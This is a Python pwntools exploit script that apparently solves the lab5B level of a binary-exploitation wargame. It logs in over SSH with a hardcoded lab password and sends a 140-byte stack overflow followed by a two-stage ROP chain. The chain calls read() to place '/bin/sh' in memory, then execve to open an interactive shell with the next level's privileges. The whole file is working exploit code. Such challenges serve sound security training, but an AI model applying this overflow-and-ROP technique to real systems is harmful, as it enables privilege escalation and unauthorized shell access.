from pwn import *
import sys


# ROP
# read user input into heap (rw-)
# 1st ROP chain: read()
# use an int 0x80 that returns to 2nd ROP chain
# 2nd ROP chain: execv() ROP
# use /bin/sh NOT /bin/bash: '/bin/bash' doesn't obtain lab5A privilege.

context.terminal = ['tmux', 'splitw', '-h']
# Crash 0x8048e89 <main+69>    ret    <0x41414141>

s = ssh(host='192.168.203.146', user='lab5B', password='s0m3tim3s_r3t2libC_1s_3n0ugh')
p = s.process("/levels/lab05/./lab5B")
#p = process("./lab5B")
#gdb.attach(p, "b *0x8048e89")


# ROP; execve('/bin/bash', 0, 0)
pop_eax = 0x080bbf26 # : pop eax ; ret
pop_ebx = 0x080481c9 # : pop ebx ; ret
pop_ecx = 0x080e55ad # : pop ecx ; ret 
pop_edx = 0x0806ec5a # : pop edx ; ret
int_80  = 0x0806f31e # : nop ; nop ; int 0x80
binsh = 0x080ec000 # heap (rw-)

# Overflow
payload = ""
payload += "A" * 140

# read(0, [heap address rw-], 7)
payload += p32(pop_eax)
payload += p32(0x3)
payload += p32(pop_ebx)
payload += p32(0x0)
payload += p32(pop_ecx)
payload += p32(binsh)
payload += p32(pop_edx)
payload += p32(7)
payload += p32(int_80)

# execve('/bin/sh',0,0)
payload += p32(pop_eax)
payload += p32(0xb)
payload += p32(pop_ebx)
payload += p32(binsh) # <==== use /bin/sh NOT /bin/bash
payload += p32(pop_ecx)
payload += p32(0x0)
payload += p32(pop_edx)
payload += p32(0x0)
payload += p32(int_80)

print p.recv()
p.sendline(payload)
p.interactive()
